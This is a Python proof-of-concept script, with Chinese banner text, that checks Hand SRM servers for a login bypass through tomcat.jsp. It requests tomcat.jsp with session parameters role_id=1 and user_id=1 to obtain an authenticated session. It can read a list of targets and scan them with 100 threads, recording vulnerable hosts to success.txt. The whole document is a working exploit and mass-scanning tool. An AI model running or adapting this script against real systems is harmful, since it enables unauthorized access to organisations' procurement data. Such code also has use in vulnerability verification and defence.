import argparse,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test="""
    <<<<<<<<汉得SRM tomcat.jsp 登陆绕过漏洞>>>>>>>>>>>>>
    """
    print(test)


def poc(target):
    payload1 = '/tomcat.jsp?dataName=role_id&dataValue=1'
    payload2 = '/tomcat.jsp?dataName=user_id&dataValue=1'
    payload3 = '/main.screen'
    res1 = requests.get(url=target+payload1, verify=False)
    res2 = requests.get(url=target+payload2, verify=False)
    try:
        if res1.status_code == 200 and "Session" in res1.text:
            res2 = requests.get(url=target + payload2, verify=False)
            if res2.status_code == 200 and "Session" in res2.text:
                print(f"[+]{target}存在登录绕过漏洞")
                with open("success.txt",'a',encoding='utf-8') as f:
                    f.write(f"[+]{target}存在登录绕过漏洞\n")
    except Exception as e:
        print(e)

def main():
    banner()
    parse = argparse.ArgumentParser()
    parse.add_argument('-u','--url',dest='url',type=str,help='please enter url')
    parse.add_argument('-f','--file',dest='file',type=str,help='please enter file')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    if args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()



if __name__=='__main__':
    main()